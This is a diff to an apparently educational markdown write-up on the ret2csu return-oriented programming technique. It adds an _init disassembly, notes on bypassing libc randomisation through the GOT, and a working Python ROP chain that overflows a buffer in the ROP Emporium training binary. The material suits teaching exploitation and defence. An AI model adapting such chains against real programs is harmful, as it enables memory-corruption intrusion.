@@ -1,4 +1,4 @@
-# ELI5 ret2csu 
+# ret2csu
 
 As far as my understanding goes, take it with a grain of salt.
 Tests programs done on an AMD64 Linux Ubuntu
@@ -203,20 +203,83 @@ Take a step back, notice the instructions numbered 1,2,3 and 4:
 
 What if, we satisfy *[1]* with a call (content of `R15`) that doesnt alter the state of our previously prepared registers (parameter registers)? 
 
-If so, with *[2]* satisfied, when ropping execution continues, *[4]* stack changes, add padding to fix that, fill those registers with dummy content, we wont need them anymore, place what you want to call on stack. *[5]* would return to that. PROFIT!
-
-In fact, 
+If so, with *[2]* satisfied, when ropping, execution continues, *[4]* stack changes, add padding to fix that, fill those registers with dummy content, we wont need them anymore, place what you want to call on stack. *[5]* would return to that. PROFIT!
 
 
+`_init` function is an example of such a function that satisfies our constraint, disassembled as below, state of registers is kept intact.
 
 
+```
+                             //
+                             // .init 
+
+                             undefined _init()
+             undefined         AL:1           <RETURN>
+                             _init                                           
+        00401000 f3 0f 1e fa     ENDBR64
+        00401004 48 83 ec 08     SUB        RSP,0x8
+        00401008 48 c7 c0        MOV        RAX,0x0
+                 00 00 00 00
+        0040100f 48 85 c0        TEST       RAX,RAX
+        00401012 74 02           JZ         LAB_00401016
+        00401014 ff d0           CALL       RAX
+                             LAB_00401016                                    
+        00401016 48 83 c4 08     ADD        RSP,0x8
+        0040101a c3              RET
+
+```
+If we could get some pointer to it, but wait remember those `_init` and `_fini` we saw earlier, some pointers must be kept somewhere.
+
+In DYNAMIC variable ie. .dynamic section of executable we can find pointers to `_init` and `_fini` section 
+
+For de-randomizing libc, one can use &GOT_TABLE[1] which is the address contained in the first GOT entry.
 
 
 ## In practice would you?
 
 ***ROP Emporium - ret2csu***
 
-call ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
+Binaries provided.
+call ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) to get a flag.
+
+```python
+init = 0x600e38
+win = 0x400510
+pop_rdi = 0x4006a3
+ret = 0x4004e6
+
+def ret2csu(call,rdi,rsi,rdx):
+	payload = p64(0x40069a)			# first call popper gadget
+	payload += p64(0x00)            # pop rbx - set to 0 since it will be incremented later
+	payload += p64(0x01)            # pop rbp - set to 1 so when compared to the incremented rbx results in equality
+	payload += p64(init)            # pop r12
+	payload += p64(rdi)             # pop r13 #rdi
+	payload += p64(rsi)             # pop r14 #rsi
+	payload += p64(rdx)             # pop r15 #rdx
+	payload += p64(0x400680)        # 2nd call caller gadget
+	payload += p64(0x00)            # add rsp,0x8 padding
+	payload += p64(0x00)            # rbx
+	payload += p64(0x00)            # rbp
+	payload += p64(0x00)            # r12
+	payload += p64(0x00)            # r13
+	payload += p64(0x00)            # r14
+	payload += p64(0x00)            # r15
+	payload += p64(pop_rdi)
+	payload += p64(rdi)
+	payload += p64(ret)
+	payload += p64(call)
+	return payload
+
+
+payload = ret2csu(win, 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) # call(rdi,rsi,rdx)
+
+eip = b'A'*40 # 32 bytes array size, 4 , 4 ,
+rop = eip + payload
+
+p.recvuntil('> ')
+p.sendline(rop)
+print(p.recvallS())
+```
 
 
 
@@ -226,6 +289,7 @@ call ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
  * https://eli.thegreenplace.net/2012/08/13/how-statically-linked-programs-run-on-linux
  * https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf
  * https://www.cs.stevens.edu/~jschauma/631A/elf.html
+ * https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html
 
 [whodis]: https://raw.githubusercontent.com/kaftejiman/pwn/main/ret2csu/whodis.jpeg 
 [calls]: https://raw.githubusercontent.com/kaftejiman/pwn/main/ret2csu/call_seq.png
